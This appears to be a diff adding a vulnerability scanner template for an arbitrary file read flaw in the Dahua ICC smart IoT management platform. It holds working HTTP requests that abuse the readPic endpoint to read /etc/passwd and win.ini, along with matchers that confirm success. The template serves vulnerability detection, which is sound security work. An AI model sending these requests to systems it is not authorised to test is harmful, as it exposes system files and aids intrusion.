@@ -1,0 +1,33 @@
+id: dahua-icc-readpic-fileread
+
+info:
+  name: 大华-智能物联综合管理平台-readpic-任意文件读取漏洞
+  author: pitaya
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Accept-Encoding: gzip
+        
+      - |
+        GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/windows/win.ini  HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Accept-Encoding: gzip
+ 
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
+          - 'for 16-bit app support'
+        condition: or
+      - type: word
+        part: header
+        words:
+          - '200'
